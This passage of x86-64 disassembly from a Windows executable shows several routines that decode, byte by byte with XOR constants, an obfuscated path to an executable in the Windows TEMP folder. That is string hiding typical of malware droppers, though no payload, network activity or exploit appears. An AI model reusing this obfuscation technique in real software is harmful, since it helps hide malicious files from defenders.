   14000249c:	41 88 40 16          	mov    %al,0x16(%r8)
   1400024a0:	4c 8b c3             	mov    %rbx,%r8
   1400024a3:	48 83 3d 45 e1 01 00 	cmpq   $0xf,0x1e145(%rip)        # 0x1400205f0
   1400024aa:	0f 
   1400024ab:	b8 17 00 00 00       	mov    $0x17,%eax
   1400024b0:	4c 0f 47 05 20 e1 01 	cmova  0x1e120(%rip),%r8        # 0x1400205d8
   1400024b7:	00 
   1400024b8:	33 d2                	xor    %edx,%edx
   1400024ba:	48 f7 f1             	div    %rcx
   1400024bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400024c2:	34 2e                	xor    $0x2e,%al
   1400024c4:	41 88 40 17          	mov    %al,0x17(%r8)
   1400024c8:	4c 8b c3             	mov    %rbx,%r8
   1400024cb:	48 83 3d 1d e1 01 00 	cmpq   $0xf,0x1e11d(%rip)        # 0x1400205f0
   1400024d2:	0f 
   1400024d3:	b8 18 00 00 00       	mov    $0x18,%eax
   1400024d8:	4c 0f 47 05 f8 e0 01 	cmova  0x1e0f8(%rip),%r8        # 0x1400205d8
   1400024df:	00 
   1400024e0:	33 d2                	xor    %edx,%edx
   1400024e2:	48 f7 f1             	div    %rcx
   1400024e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400024ea:	34 65                	xor    $0x65,%al
   1400024ec:	41 88 40 18          	mov    %al,0x18(%r8)
   1400024f0:	4c 8b c3             	mov    %rbx,%r8
   1400024f3:	48 83 3d f5 e0 01 00 	cmpq   $0xf,0x1e0f5(%rip)        # 0x1400205f0
   1400024fa:	0f 
   1400024fb:	b8 19 00 00 00       	mov    $0x19,%eax
   140002500:	4c 0f 47 05 d0 e0 01 	cmova  0x1e0d0(%rip),%r8        # 0x1400205d8
   140002507:	00 
   140002508:	33 d2                	xor    %edx,%edx
   14000250a:	48 f7 f1             	div    %rcx
   14000250d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002512:	34 78                	xor    $0x78,%al
   140002514:	41 88 40 19          	mov    %al,0x19(%r8)
   140002518:	4c 8b c3             	mov    %rbx,%r8
   14000251b:	48 83 3d cd e0 01 00 	cmpq   $0xf,0x1e0cd(%rip)        # 0x1400205f0
   140002522:	0f 
   140002523:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140002528:	4c 0f 47 05 a8 e0 01 	cmova  0x1e0a8(%rip),%r8        # 0x1400205d8
   14000252f:	00 
   140002530:	33 d2                	xor    %edx,%edx
   140002532:	48 f7 f1             	div    %rcx
   140002535:	48 8b c3             	mov    %rbx,%rax
   140002538:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   14000253d:	80 f1 65             	xor    $0x65,%cl
   140002540:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140002544:	48 83 c4 30          	add    $0x30,%rsp
   140002548:	5b                   	pop    %rbx
   140002549:	c3                   	ret
   14000254a:	cc                   	int3
   14000254b:	cc                   	int3
   14000254c:	cc                   	int3
   14000254d:	cc                   	int3
   14000254e:	cc                   	int3
   14000254f:	cc                   	int3
   140002550:	40 53                	rex push %rbx
   140002552:	48 83 ec 30          	sub    $0x30,%rsp
   140002556:	48 8d 1d db df 01 00 	lea    0x1dfdb(%rip),%rbx        # 0x140020538
   14000255d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140002562:	48 8b cb             	mov    %rbx,%rcx
   140002565:	e8 f6 3e 00 00       	call   0x140006460
   14000256a:	4c 8d 0d 6f c3 00 00 	lea    0xc36f(%rip),%r9        # 0x14000e8e0
   140002571:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002578:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000257f:	00 
   140002580:	48 ff c1             	inc    %rcx
   140002583:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140002588:	75 f6                	jne    0x140002580
   14000258a:	48 83 3d be df 01 00 	cmpq   $0xf,0x1dfbe(%rip)        # 0x140020550
   140002591:	0f 
   140002592:	48 8b c3             	mov    %rbx,%rax
   140002595:	4c 8b c3             	mov    %rbx,%r8
   140002598:	48 0f 47 05 98 df 01 	cmova  0x1df98(%rip),%rax        # 0x140020538
   14000259f:	00 
   1400025a0:	c6 00 2c             	movb   $0x2c,(%rax)
   1400025a3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400025a8:	48 83 3d a0 df 01 00 	cmpq   $0xf,0x1dfa0(%rip)        # 0x140020550
   1400025af:	0f 
   1400025b0:	4c 0f 47 05 80 df 01 	cmova  0x1df80(%rip),%r8        # 0x140020538
   1400025b7:	00 
   1400025b8:	33 d2                	xor    %edx,%edx
   1400025ba:	48 f7 f1             	div    %rcx
   1400025bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400025c2:	34 3a                	xor    $0x3a,%al
   1400025c4:	41 88 40 01          	mov    %al,0x1(%r8)
   1400025c8:	4c 8b c3             	mov    %rbx,%r8
   1400025cb:	48 83 3d 7d df 01 00 	cmpq   $0xf,0x1df7d(%rip)        # 0x140020550
   1400025d2:	0f 
   1400025d3:	b8 02 00 00 00       	mov    $0x2,%eax
   1400025d8:	4c 0f 47 05 58 df 01 	cmova  0x1df58(%rip),%r8        # 0x140020538
   1400025df:	00 
   1400025e0:	33 d2                	xor    %edx,%edx
   1400025e2:	48 f7 f1             	div    %rcx
   1400025e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400025ea:	34 5c                	xor    $0x5c,%al
   1400025ec:	41 88 40 02          	mov    %al,0x2(%r8)
   1400025f0:	4c 8b c3             	mov    %rbx,%r8
   1400025f3:	48 83 3d 55 df 01 00 	cmpq   $0xf,0x1df55(%rip)        # 0x140020550
   1400025fa:	0f 
   1400025fb:	b8 03 00 00 00       	mov    $0x3,%eax
   140002600:	4c 0f 47 05 30 df 01 	cmova  0x1df30(%rip),%r8        # 0x140020538
   140002607:	00 
   140002608:	33 d2                	xor    %edx,%edx
   14000260a:	48 f7 f1             	div    %rcx
   14000260d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002612:	34 57                	xor    $0x57,%al
   140002614:	41 88 40 03          	mov    %al,0x3(%r8)
   140002618:	4c 8b c3             	mov    %rbx,%r8
   14000261b:	48 83 3d 2d df 01 00 	cmpq   $0xf,0x1df2d(%rip)        # 0x140020550
   140002622:	0f 
   140002623:	b8 04 00 00 00       	mov    $0x4,%eax
   140002628:	4c 0f 47 05 08 df 01 	cmova  0x1df08(%rip),%r8        # 0x140020538
   14000262f:	00 
   140002630:	33 d2                	xor    %edx,%edx
   140002632:	48 f7 f1             	div    %rcx
   140002635:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000263a:	34 69                	xor    $0x69,%al
   14000263c:	41 88 40 04          	mov    %al,0x4(%r8)
   140002640:	4c 8b c3             	mov    %rbx,%r8
   140002643:	48 83 3d 05 df 01 00 	cmpq   $0xf,0x1df05(%rip)        # 0x140020550
   14000264a:	0f 
   14000264b:	b8 05 00 00 00       	mov    $0x5,%eax
   140002650:	4c 0f 47 05 e0 de 01 	cmova  0x1dee0(%rip),%r8        # 0x140020538
   140002657:	00 
   140002658:	33 d2                	xor    %edx,%edx
   14000265a:	48 f7 f1             	div    %rcx
   14000265d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002662:	34 6e                	xor    $0x6e,%al
   140002664:	41 88 40 05          	mov    %al,0x5(%r8)
   140002668:	4c 8b c3             	mov    %rbx,%r8
   14000266b:	48 83 3d dd de 01 00 	cmpq   $0xf,0x1dedd(%rip)        # 0x140020550
   140002672:	0f 
   140002673:	b8 06 00 00 00       	mov    $0x6,%eax
   140002678:	4c 0f 47 05 b8 de 01 	cmova  0x1deb8(%rip),%r8        # 0x140020538
   14000267f:	00 
   140002680:	33 d2                	xor    %edx,%edx
   140002682:	48 f7 f1             	div    %rcx
   140002685:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000268a:	34 64                	xor    $0x64,%al
   14000268c:	41 88 40 06          	mov    %al,0x6(%r8)
   140002690:	4c 8b c3             	mov    %rbx,%r8
   140002693:	48 83 3d b5 de 01 00 	cmpq   $0xf,0x1deb5(%rip)        # 0x140020550
   14000269a:	0f 
   14000269b:	b8 07 00 00 00       	mov    $0x7,%eax
   1400026a0:	4c 0f 47 05 90 de 01 	cmova  0x1de90(%rip),%r8        # 0x140020538
   1400026a7:	00 
   1400026a8:	33 d2                	xor    %edx,%edx
   1400026aa:	48 f7 f1             	div    %rcx
   1400026ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400026b2:	34 6f                	xor    $0x6f,%al
   1400026b4:	41 88 40 07          	mov    %al,0x7(%r8)
   1400026b8:	4c 8b c3             	mov    %rbx,%r8
   1400026bb:	48 83 3d 8d de 01 00 	cmpq   $0xf,0x1de8d(%rip)        # 0x140020550
   1400026c2:	0f 
   1400026c3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400026c8:	4c 0f 47 05 68 de 01 	cmova  0x1de68(%rip),%r8        # 0x140020538
   1400026cf:	00 
   1400026d0:	33 d2                	xor    %edx,%edx
   1400026d2:	48 f7 f1             	div    %rcx
   1400026d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400026da:	34 77                	xor    $0x77,%al
   1400026dc:	41 88 40 08          	mov    %al,0x8(%r8)
   1400026e0:	4c 8b c3             	mov    %rbx,%r8
   1400026e3:	48 83 3d 65 de 01 00 	cmpq   $0xf,0x1de65(%rip)        # 0x140020550
   1400026ea:	0f 
   1400026eb:	b8 09 00 00 00       	mov    $0x9,%eax
   1400026f0:	4c 0f 47 05 40 de 01 	cmova  0x1de40(%rip),%r8        # 0x140020538
   1400026f7:	00 
   1400026f8:	33 d2                	xor    %edx,%edx
   1400026fa:	48 f7 f1             	div    %rcx
   1400026fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002702:	34 73                	xor    $0x73,%al
   140002704:	41 88 40 09          	mov    %al,0x9(%r8)
   140002708:	4c 8b c3             	mov    %rbx,%r8
   14000270b:	48 83 3d 3d de 01 00 	cmpq   $0xf,0x1de3d(%rip)        # 0x140020550
   140002712:	0f 
   140002713:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002718:	4c 0f 47 05 18 de 01 	cmova  0x1de18(%rip),%r8        # 0x140020538
   14000271f:	00 
   140002720:	33 d2                	xor    %edx,%edx
   140002722:	48 f7 f1             	div    %rcx
   140002725:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000272a:	34 5c                	xor    $0x5c,%al
   14000272c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140002730:	4c 8b c3             	mov    %rbx,%r8
   140002733:	48 83 3d 15 de 01 00 	cmpq   $0xf,0x1de15(%rip)        # 0x140020550
   14000273a:	0f 
   14000273b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140002740:	4c 0f 47 05 f0 dd 01 	cmova  0x1ddf0(%rip),%r8        # 0x140020538
   140002747:	00 
   140002748:	33 d2                	xor    %edx,%edx
   14000274a:	48 f7 f1             	div    %rcx
   14000274d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002752:	34 54                	xor    $0x54,%al
   140002754:	41 88 40 0b          	mov    %al,0xb(%r8)
   140002758:	4c 8b c3             	mov    %rbx,%r8
   14000275b:	48 83 3d ed dd 01 00 	cmpq   $0xf,0x1dded(%rip)        # 0x140020550
   140002762:	0f 
   140002763:	b8 0c 00 00 00       	mov    $0xc,%eax
   140002768:	4c 0f 47 05 c8 dd 01 	cmova  0x1ddc8(%rip),%r8        # 0x140020538
   14000276f:	00 
   140002770:	33 d2                	xor    %edx,%edx
   140002772:	48 f7 f1             	div    %rcx
   140002775:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000277a:	34 45                	xor    $0x45,%al
   14000277c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140002780:	4c 8b c3             	mov    %rbx,%r8
   140002783:	48 83 3d c5 dd 01 00 	cmpq   $0xf,0x1ddc5(%rip)        # 0x140020550
   14000278a:	0f 
   14000278b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140002790:	4c 0f 47 05 a0 dd 01 	cmova  0x1dda0(%rip),%r8        # 0x140020538
   140002797:	00 
   140002798:	33 d2                	xor    %edx,%edx
   14000279a:	48 f7 f1             	div    %rcx
   14000279d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400027a2:	34 4d                	xor    $0x4d,%al
   1400027a4:	41 88 40 0d          	mov    %al,0xd(%r8)
   1400027a8:	4c 8b c3             	mov    %rbx,%r8
   1400027ab:	48 83 3d 9d dd 01 00 	cmpq   $0xf,0x1dd9d(%rip)        # 0x140020550
   1400027b2:	0f 
   1400027b3:	b8 0e 00 00 00       	mov    $0xe,%eax
   1400027b8:	4c 0f 47 05 78 dd 01 	cmova  0x1dd78(%rip),%r8        # 0x140020538
   1400027bf:	00 
   1400027c0:	33 d2                	xor    %edx,%edx
   1400027c2:	48 f7 f1             	div    %rcx
   1400027c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400027ca:	34 50                	xor    $0x50,%al
   1400027cc:	41 88 40 0e          	mov    %al,0xe(%r8)
   1400027d0:	4c 8b c3             	mov    %rbx,%r8
   1400027d3:	48 83 3d 75 dd 01 00 	cmpq   $0xf,0x1dd75(%rip)        # 0x140020550
   1400027da:	0f 
   1400027db:	b8 0f 00 00 00       	mov    $0xf,%eax
   1400027e0:	4c 0f 47 05 50 dd 01 	cmova  0x1dd50(%rip),%r8        # 0x140020538
   1400027e7:	00 
   1400027e8:	33 d2                	xor    %edx,%edx
   1400027ea:	48 f7 f1             	div    %rcx
   1400027ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400027f2:	34 5c                	xor    $0x5c,%al
   1400027f4:	41 88 40 0f          	mov    %al,0xf(%r8)
   1400027f8:	4c 8b c3             	mov    %rbx,%r8
   1400027fb:	48 83 3d 4d dd 01 00 	cmpq   $0xf,0x1dd4d(%rip)        # 0x140020550
   140002802:	0f 
   140002803:	b8 10 00 00 00       	mov    $0x10,%eax
   140002808:	4c 0f 47 05 28 dd 01 	cmova  0x1dd28(%rip),%r8        # 0x140020538
   14000280f:	00 
   140002810:	33 d2                	xor    %edx,%edx
   140002812:	48 f7 f1             	div    %rcx
   140002815:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000281a:	34 67                	xor    $0x67,%al
   14000281c:	41 88 40 10          	mov    %al,0x10(%r8)
   140002820:	4c 8b c3             	mov    %rbx,%r8
   140002823:	48 83 3d 25 dd 01 00 	cmpq   $0xf,0x1dd25(%rip)        # 0x140020550
   14000282a:	0f 
   14000282b:	b8 11 00 00 00       	mov    $0x11,%eax
   140002830:	4c 0f 47 05 00 dd 01 	cmova  0x1dd00(%rip),%r8        # 0x140020538
   140002837:	00 
   140002838:	33 d2                	xor    %edx,%edx
   14000283a:	48 f7 f1             	div    %rcx
   14000283d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002842:	34 69                	xor    $0x69,%al
   140002844:	41 88 40 11          	mov    %al,0x11(%r8)
   140002848:	4c 8b c3             	mov    %rbx,%r8
   14000284b:	48 83 3d fd dc 01 00 	cmpq   $0xf,0x1dcfd(%rip)        # 0x140020550
   140002852:	0f 
   140002853:	b8 12 00 00 00       	mov    $0x12,%eax
   140002858:	4c 0f 47 05 d8 dc 01 	cmova  0x1dcd8(%rip),%r8        # 0x140020538
   14000285f:	00 
   140002860:	33 d2                	xor    %edx,%edx
   140002862:	48 f7 f1             	div    %rcx
   140002865:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000286a:	34 61                	xor    $0x61,%al
   14000286c:	41 88 40 12          	mov    %al,0x12(%r8)
   140002870:	4c 8b c3             	mov    %rbx,%r8
   140002873:	48 83 3d d5 dc 01 00 	cmpq   $0xf,0x1dcd5(%rip)        # 0x140020550
   14000287a:	0f 
   14000287b:	b8 13 00 00 00       	mov    $0x13,%eax
   140002880:	4c 0f 47 05 b0 dc 01 	cmova  0x1dcb0(%rip),%r8        # 0x140020538
   140002887:	00 
   140002888:	33 d2                	xor    %edx,%edx
   14000288a:	48 f7 f1             	div    %rcx
   14000288d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002892:	34 6e                	xor    $0x6e,%al
   140002894:	41 88 40 13          	mov    %al,0x13(%r8)
   140002898:	4c 8b c3             	mov    %rbx,%r8
   14000289b:	48 83 3d ad dc 01 00 	cmpq   $0xf,0x1dcad(%rip)        # 0x140020550
   1400028a2:	0f 
   1400028a3:	b8 14 00 00 00       	mov    $0x14,%eax
   1400028a8:	4c 0f 47 05 88 dc 01 	cmova  0x1dc88(%rip),%r8        # 0x140020538
   1400028af:	00 
   1400028b0:	33 d2                	xor    %edx,%edx
   1400028b2:	48 f7 f1             	div    %rcx
   1400028b5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400028ba:	34 6e                	xor    $0x6e,%al
   1400028bc:	41 88 40 14          	mov    %al,0x14(%r8)
   1400028c0:	4c 8b c3             	mov    %rbx,%r8
   1400028c3:	48 83 3d 85 dc 01 00 	cmpq   $0xf,0x1dc85(%rip)        # 0x140020550
   1400028ca:	0f 
   1400028cb:	b8 15 00 00 00       	mov    $0x15,%eax
   1400028d0:	4c 0f 47 05 60 dc 01 	cmova  0x1dc60(%rip),%r8        # 0x140020538
   1400028d7:	00 
   1400028d8:	33 d2                	xor    %edx,%edx
   1400028da:	48 f7 f1             	div    %rcx
   1400028dd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400028e2:	34 69                	xor    $0x69,%al
   1400028e4:	41 88 40 15          	mov    %al,0x15(%r8)
   1400028e8:	4c 8b c3             	mov    %rbx,%r8
   1400028eb:	48 83 3d 5d dc 01 00 	cmpq   $0xf,0x1dc5d(%rip)        # 0x140020550
   1400028f2:	0f 
   1400028f3:	b8 16 00 00 00       	mov    $0x16,%eax
   1400028f8:	4c 0f 47 05 38 dc 01 	cmova  0x1dc38(%rip),%r8        # 0x140020538
   1400028ff:	00 
   140002900:	33 d2                	xor    %edx,%edx
   140002902:	48 f7 f1             	div    %rcx
   140002905:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000290a:	34 33                	xor    $0x33,%al
   14000290c:	41 88 40 16          	mov    %al,0x16(%r8)
   140002910:	4c 8b c3             	mov    %rbx,%r8
   140002913:	48 83 3d 35 dc 01 00 	cmpq   $0xf,0x1dc35(%rip)        # 0x140020550
   14000291a:	0f 
   14000291b:	b8 17 00 00 00       	mov    $0x17,%eax
   140002920:	4c 0f 47 05 10 dc 01 	cmova  0x1dc10(%rip),%r8        # 0x140020538
   140002927:	00 
   140002928:	33 d2                	xor    %edx,%edx
   14000292a:	48 f7 f1             	div    %rcx
   14000292d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002932:	34 2e                	xor    $0x2e,%al
   140002934:	41 88 40 17          	mov    %al,0x17(%r8)
   140002938:	4c 8b c3             	mov    %rbx,%r8
   14000293b:	48 83 3d 0d dc 01 00 	cmpq   $0xf,0x1dc0d(%rip)        # 0x140020550
   140002942:	0f 
   140002943:	b8 18 00 00 00       	mov    $0x18,%eax
   140002948:	4c 0f 47 05 e8 db 01 	cmova  0x1dbe8(%rip),%r8        # 0x140020538
   14000294f:	00 
   140002950:	33 d2                	xor    %edx,%edx
   140002952:	48 f7 f1             	div    %rcx
   140002955:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000295a:	34 65                	xor    $0x65,%al
   14000295c:	41 88 40 18          	mov    %al,0x18(%r8)
   140002960:	4c 8b c3             	mov    %rbx,%r8
   140002963:	48 83 3d e5 db 01 00 	cmpq   $0xf,0x1dbe5(%rip)        # 0x140020550
   14000296a:	0f 
   14000296b:	b8 19 00 00 00       	mov    $0x19,%eax
   140002970:	4c 0f 47 05 c0 db 01 	cmova  0x1dbc0(%rip),%r8        # 0x140020538
   140002977:	00 
   140002978:	33 d2                	xor    %edx,%edx
   14000297a:	48 f7 f1             	div    %rcx
   14000297d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002982:	34 78                	xor    $0x78,%al
   140002984:	41 88 40 19          	mov    %al,0x19(%r8)
   140002988:	4c 8b c3             	mov    %rbx,%r8
   14000298b:	48 83 3d bd db 01 00 	cmpq   $0xf,0x1dbbd(%rip)        # 0x140020550
   140002992:	0f 
   140002993:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140002998:	4c 0f 47 05 98 db 01 	cmova  0x1db98(%rip),%r8        # 0x140020538
   14000299f:	00 
   1400029a0:	33 d2                	xor    %edx,%edx
   1400029a2:	48 f7 f1             	div    %rcx
   1400029a5:	48 8b c3             	mov    %rbx,%rax
   1400029a8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   1400029ad:	80 f1 65             	xor    $0x65,%cl
   1400029b0:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   1400029b4:	48 83 c4 30          	add    $0x30,%rsp
   1400029b8:	5b                   	pop    %rbx
   1400029b9:	c3                   	ret
   1400029ba:	cc                   	int3
   1400029bb:	cc                   	int3
   1400029bc:	cc                   	int3
   1400029bd:	cc                   	int3
   1400029be:	cc                   	int3
   1400029bf:	cc                   	int3
   1400029c0:	40 53                	rex push %rbx
   1400029c2:	48 83 ec 30          	sub    $0x30,%rsp
   1400029c6:	48 8d 1d cb db 01 00 	lea    0x1dbcb(%rip),%rbx        # 0x140020598
   1400029cd:	ba 1b 00 00 00       	mov    $0x1b,%edx
   1400029d2:	48 8b cb             	mov    %rbx,%rcx
   1400029d5:	e8 86 3a 00 00       	call   0x140006460
   1400029da:	4c 8d 0d 0f bf 00 00 	lea    0xbf0f(%rip),%r9        # 0x14000e8f0
   1400029e1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400029e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400029ef:	00 
   1400029f0:	48 ff c1             	inc    %rcx
   1400029f3:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   1400029f8:	75 f6                	jne    0x1400029f0
   1400029fa:	48 83 3d ae db 01 00 	cmpq   $0xf,0x1dbae(%rip)        # 0x1400205b0
   140002a01:	0f 
   140002a02:	48 8b c3             	mov    %rbx,%rax
   140002a05:	4c 8b c3             	mov    %rbx,%r8
   140002a08:	48 0f 47 05 88 db 01 	cmova  0x1db88(%rip),%rax        # 0x140020598
   140002a0f:	00 
   140002a10:	c6 00 25             	movb   $0x25,(%rax)
   140002a13:	b8 01 00 00 00       	mov    $0x1,%eax
   140002a18:	48 83 3d 90 db 01 00 	cmpq   $0xf,0x1db90(%rip)        # 0x1400205b0
   140002a1f:	0f 
   140002a20:	4c 0f 47 05 70 db 01 	cmova  0x1db70(%rip),%r8        # 0x140020598
   140002a27:	00 
   140002a28:	33 d2                	xor    %edx,%edx
   140002a2a:	48 f7 f1             	div    %rcx
   140002a2d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002a32:	34 3a                	xor    $0x3a,%al
   140002a34:	41 88 40 01          	mov    %al,0x1(%r8)
   140002a38:	4c 8b c3             	mov    %rbx,%r8
   140002a3b:	48 83 3d 6d db 01 00 	cmpq   $0xf,0x1db6d(%rip)        # 0x1400205b0
   140002a42:	0f 
   140002a43:	b8 02 00 00 00       	mov    $0x2,%eax
   140002a48:	4c 0f 47 05 48 db 01 	cmova  0x1db48(%rip),%r8        # 0x140020598
   140002a4f:	00 
   140002a50:	33 d2                	xor    %edx,%edx
   140002a52:	48 f7 f1             	div    %rcx
   140002a55:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002a5a:	34 5c                	xor    $0x5c,%al
   140002a5c:	41 88 40 02          	mov    %al,0x2(%r8)
   140002a60:	4c 8b c3             	mov    %rbx,%r8
   140002a63:	48 83 3d 45 db 01 00 	cmpq   $0xf,0x1db45(%rip)        # 0x1400205b0
   140002a6a:	0f 
   140002a6b:	b8 03 00 00 00       	mov    $0x3,%eax
   140002a70:	4c 0f 47 05 20 db 01 	cmova  0x1db20(%rip),%r8        # 0x140020598
   140002a77:	00 
   140002a78:	33 d2                	xor    %edx,%edx
   140002a7a:	48 f7 f1             	div    %rcx
   140002a7d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002a82:	34 57                	xor    $0x57,%al
   140002a84:	41 88 40 03          	mov    %al,0x3(%r8)
   140002a88:	4c 8b c3             	mov    %rbx,%r8
   140002a8b:	48 83 3d 1d db 01 00 	cmpq   $0xf,0x1db1d(%rip)        # 0x1400205b0
   140002a92:	0f 
   140002a93:	b8 04 00 00 00       	mov    $0x4,%eax
   140002a98:	4c 0f 47 05 f8 da 01 	cmova  0x1daf8(%rip),%r8        # 0x140020598
   140002a9f:	00 
   140002aa0:	33 d2                	xor    %edx,%edx
   140002aa2:	48 f7 f1             	div    %rcx
   140002aa5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002aaa:	34 69                	xor    $0x69,%al
   140002aac:	41 88 40 04          	mov    %al,0x4(%r8)
   140002ab0:	4c 8b c3             	mov    %rbx,%r8
   140002ab3:	48 83 3d f5 da 01 00 	cmpq   $0xf,0x1daf5(%rip)        # 0x1400205b0
   140002aba:	0f 
   140002abb:	b8 05 00 00 00       	mov    $0x5,%eax
   140002ac0:	4c 0f 47 05 d0 da 01 	cmova  0x1dad0(%rip),%r8        # 0x140020598
   140002ac7:	00 
   140002ac8:	33 d2                	xor    %edx,%edx
   140002aca:	48 f7 f1             	div    %rcx
   140002acd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002ad2:	34 6e                	xor    $0x6e,%al
   140002ad4:	41 88 40 05          	mov    %al,0x5(%r8)
   140002ad8:	4c 8b c3             	mov    %rbx,%r8
   140002adb:	48 83 3d cd da 01 00 	cmpq   $0xf,0x1dacd(%rip)        # 0x1400205b0
   140002ae2:	0f 
   140002ae3:	b8 06 00 00 00       	mov    $0x6,%eax
   140002ae8:	4c 0f 47 05 a8 da 01 	cmova  0x1daa8(%rip),%r8        # 0x140020598
   140002aef:	00 
   140002af0:	33 d2                	xor    %edx,%edx
   140002af2:	48 f7 f1             	div    %rcx
   140002af5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002afa:	34 64                	xor    $0x64,%al
   140002afc:	41 88 40 06          	mov    %al,0x6(%r8)
   140002b00:	4c 8b c3             	mov    %rbx,%r8
   140002b03:	48 83 3d a5 da 01 00 	cmpq   $0xf,0x1daa5(%rip)        # 0x1400205b0
   140002b0a:	0f 
   140002b0b:	b8 07 00 00 00       	mov    $0x7,%eax
   140002b10:	4c 0f 47 05 80 da 01 	cmova  0x1da80(%rip),%r8        # 0x140020598
   140002b17:	00 
   140002b18:	33 d2                	xor    %edx,%edx
   140002b1a:	48 f7 f1             	div    %rcx
   140002b1d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002b22:	34 6f                	xor    $0x6f,%al
   140002b24:	41 88 40 07          	mov    %al,0x7(%r8)
   140002b28:	4c 8b c3             	mov    %rbx,%r8
   140002b2b:	48 83 3d 7d da 01 00 	cmpq   $0xf,0x1da7d(%rip)        # 0x1400205b0
   140002b32:	0f 
   140002b33:	b8 08 00 00 00       	mov    $0x8,%eax
   140002b38:	4c 0f 47 05 58 da 01 	cmova  0x1da58(%rip),%r8        # 0x140020598
   140002b3f:	00 
   140002b40:	33 d2                	xor    %edx,%edx
   140002b42:	48 f7 f1             	div    %rcx
   140002b45:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002b4a:	34 77                	xor    $0x77,%al
   140002b4c:	41 88 40 08          	mov    %al,0x8(%r8)
   140002b50:	4c 8b c3             	mov    %rbx,%r8
   140002b53:	48 83 3d 55 da 01 00 	cmpq   $0xf,0x1da55(%rip)        # 0x1400205b0
   140002b5a:	0f 
   140002b5b:	b8 09 00 00 00       	mov    $0x9,%eax
   140002b60:	4c 0f 47 05 30 da 01 	cmova  0x1da30(%rip),%r8        # 0x140020598
   140002b67:	00 
   140002b68:	33 d2                	xor    %edx,%edx
   140002b6a:	48 f7 f1             	div    %rcx
   140002b6d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002b72:	34 73                	xor    $0x73,%al
   140002b74:	41 88 40 09          	mov    %al,0x9(%r8)
   140002b78:	4c 8b c3             	mov    %rbx,%r8
   140002b7b:	48 83 3d 2d da 01 00 	cmpq   $0xf,0x1da2d(%rip)        # 0x1400205b0
   140002b82:	0f 
   140002b83:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002b88:	4c 0f 47 05 08 da 01 	cmova  0x1da08(%rip),%r8        # 0x140020598
   140002b8f:	00 
   140002b90:	33 d2                	xor    %edx,%edx
   140002b92:	48 f7 f1             	div    %rcx
   140002b95:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002b9a:	34 5c                	xor    $0x5c,%al
   140002b9c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140002ba0:	4c 8b c3             	mov    %rbx,%r8
   140002ba3:	48 83 3d 05 da 01 00 	cmpq   $0xf,0x1da05(%rip)        # 0x1400205b0
   140002baa:	0f 
   140002bab:	b8 0b 00 00 00       	mov    $0xb,%eax
   140002bb0:	4c 0f 47 05 e0 d9 01 	cmova  0x1d9e0(%rip),%r8        # 0x140020598
   140002bb7:	00 
